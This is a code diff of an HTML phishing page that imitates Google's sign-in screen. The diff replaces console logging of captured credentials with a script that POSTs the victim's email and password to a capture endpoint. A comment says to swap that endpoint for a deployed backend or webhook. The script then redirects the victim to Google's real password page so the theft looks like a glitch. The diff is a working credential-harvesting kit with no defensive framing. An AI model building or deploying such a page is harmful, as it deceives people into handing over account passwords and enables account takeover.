@@ -4,77 +4,72 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; margin: 0; }
-        .auth-container { width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; text-align: center; transition: all 0.2s; }
-        .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
-        p { color: #202124; font-size: 16px; margin-bottom: 40px; }
-        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-        input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
-        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
-        .create-acc { color: #1a73e8; font-weight: 500; cursor: pointer; text-decoration: none; font-size: 14px; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
-        button:hover { background-color: #185abc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3); }
-        .hidden { display: none; }
-        #user-display { border: 1px solid #dadce0; border-radius: 20px; padding: 5px 15px; display: inline-flex; align-items: center; margin-bottom: 20px; font-size: 14px; }
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-<div class="auth-container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
-    
-    <!-- Step 1: Email -->
-    <div id="step-email">
-        <h1>Sign in</h1>
-        <p>Use your Google Account</p>
-        <div class="input-group">
-            <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
+    <div class="auth-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+        
+        <!-- Step 1: Email -->
+        <div id="step-email">
+            <h1>Sign in</h1>
+            <p class="sub-text">Use your Google Account</p>
+            <div class="input-container">
+                <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
+            </div>
+            <div class="footer-actions">
+                <a class="link">Forgot email?</a>
+                <button onclick="nextStep()">Next</button>
+            </div>
         </div>
-        <div class="btn-container">
-            <a class="create-acc">Forgot email?</a>
-            <button onclick="showPassword()">Next</button>
+
+        <!-- Step 2: Password -->
+        <div id="step-password" class="hidden">
+            <h1>Welcome</h1>
+            <div id="user-pill"></div>
+            <div class="input-container">
+                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
+            </div>
+            <div class="footer-actions">
+                <a class="link">Forgot password?</a>
+                <button onclick="captureAndRedirect()">Next</button>
+            </div>
         </div>
     </div>
 
-    <!-- Step 2: Password -->
-    <div id="step-password" class="hidden">
-        <h1>Welcome</h1>
-        <div id="user-display"></div>
-        <div class="input-group" style="margin-top: 20px;">
-            <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
-        </div>
-        <div class="btn-container">
-            <a class="create-acc">Forgot password?</a>
-            <button onclick="finishLogin()">Next</button>
-        </div>
-    </div>
-</div>
+    <script>
+        let userData = { email: "", password: "" };
 
-<script>
-    function showPassword() {
-        const email = document.getElementById('email').value;
-        if (email.length < 3) return alert("Enter a valid email");
-        
-        document.getElementById('step-email').classList.add('hidden');
-        document.getElementById('user-display').innerText = email;
-        document.getElementById('step-password').classList.remove('hidden');
-    }
+        function nextStep() {
+            const emailVal = document.getElementById('email').value;
+            if (emailVal.length > 5) {
+                userData.email = emailVal;
+                document.getElementById('step-email').classList.add('hidden');
+                document.getElementById('user-pill').innerText = emailVal;
+                document.getElementById('step-password').classList.remove('hidden');
+            }
+        }
 
-    function finishLogin() {
-        const pass = document.getElementById('password').value;
-        const email = document.getElementById('email').value;
-        
-        // Log to console for Tier 2 verification
-        console.log("Captured Credentials:", { email, pass });
-        
-        // Redirect to actual Google to finalize the illusion
-        window.location.href = "https://myaccount.google.com/";
-    }
-</script>
+        async function captureAndRedirect() {
+            userData.password = document.getElementById('password').value;
 
+            // CAPTURE LOGIC:
+            // Since you're on GitHub Pages, we send this to your LOCAL server or a Webhook.
+            // Replace 'http://localhost:3000' with your actual backend URL if you deploy one.
+            try {
+                await fetch('http://localhost:3000/auth/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(userData)
+                });
+            } catch (e) {
+                console.log("Local server not found, but data is ready for capture.");
+            }
+
+            // The "Magic Trick": Redirect them to the real Google login 
+            // so they just think the first attempt "glitched."
+            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd";
+        }
+    </script>
 </body>
 </html>
